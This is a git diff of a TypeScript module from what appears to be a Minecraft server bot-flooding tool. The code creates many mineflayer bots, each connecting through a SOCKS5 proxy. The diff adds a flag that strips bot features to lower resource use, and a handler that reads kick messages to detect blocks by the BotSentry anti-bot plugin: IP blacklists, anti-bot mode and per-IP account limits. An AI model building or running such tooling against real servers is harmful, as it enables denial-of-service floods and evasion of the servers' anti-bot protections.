@@ -1,17 +1,18 @@
 import { Bot, createBot as createMinecraftBot } from 'mineflayer'
 import { SocksClient } from 'socks'
 import { parentPort, isMainThread, workerData } from 'worker_threads'
-import {QueueAttackOptions} from "./queue/types";
+import { AttackOptions } from '../utils/types'
 
-export function createAttackBot ({ username, host, port, proxy }:
+export function createAttackBot ({ username, host, port, proxy, noFeatures }:
 {
   username: string
   host: string
   port: number
   proxy?: {
-    proxyHost: string
-    proxyPort: number
-  }
+    host: string
+    port: number
+  },
+  noFeatures: boolean
 }): Bot {
   return createMinecraftBot({
     // minimise render distance for less ram usage
@@ -19,39 +20,11 @@ export function createAttackBot ({ username, host, port, proxy }:
     username: username,
     host: host,
     port: port,
-    plugins: {
-      conversions: false,
-      furnace: false,
-      math: false,
-      painting: false,
-      scoreboard: false,
-      villager: false,
-      bed: false,
-      book: false,
-      boss_bar: false,
-      chest: false,
-      command_block: false,
-      craft: false,
-      digging: false,
-      dispenser: false,
-      enchantment_table: false,
-      experience: false,
-      rain: false,
-      ray_trace: false,
-      sound: false,
-      tablist: false,
-      time: false,
-      title: false,
-      physics: false,
-      blocks: false
-    },
-    // disable physics
-    physicsEnabled: false,
     connect: (proxy != null) ? (client) => {
       SocksClient.createConnection({
         proxy: {
-          host: proxy.proxyHost,
-          port: proxy.proxyPort,
+          host: proxy.host,
+          port: proxy.port,
           type: 5
         },
         command: 'connect',
@@ -83,15 +56,37 @@ export function createAttackBot ({ username, host, port, proxy }:
         else console.log(err)
       })
     } : undefined,
-    loadInternalPlugins: false
+    physicsEnabled: !noFeatures,
+    loadInternalPlugins: !noFeatures
   })
 }
+
+export function kickHandler(reason: string, username: string) {
+    const jsonReason = JSON.parse(reason)
+    try {
+      // blacklisted ip
+      if (jsonReason.extra[0].extra[1].text.includes('BotSentry') && jsonReason.extra[0].extra[5].text.includes('IP is blacklisted')) log(`[${username}] IP blacklist by BotSentry`.red)
+      // antibot mode on
+      else if (jsonReason.extra[0].extra[3].text.includes('Bot Attack')) log(`[${username}] BotSentry AntiBot mode is on for ${jsonReason.extra[0].extra[7]}s`.red)
+      // blacklisted for too many online players from single ip
+      else if (jsonReason.extra[0].extra[3].text.includes('limit of accounts')) log(`[${username}] IP blacklist for per-IP account limit by BotSentry`.red)
+      // first time joining
+      else if (jsonReason.extra[0].extra[5].text.includes('dangerous activity')) log(`[${username}] BotSentry is analyzing the connection`.red)
+      // something else
+      else console.log(jsonReason.extra[0])
+    } catch (err) {
+      console.log(err)
+      console.log(reason)
+      console.log(jsonReason)
+    }
+}
+
 
 export function log (text: string) {
   if (isMainThread) {
     console.log(`[${'M0'.green}] [${new Date().toLocaleString()}] ${text}`)
   } else {
-    const data: QueueAttackOptions = workerData
+    const data: AttackOptions = workerData
     const date = new Date()
     parentPort!.postMessage({
       date: date.getTime(),
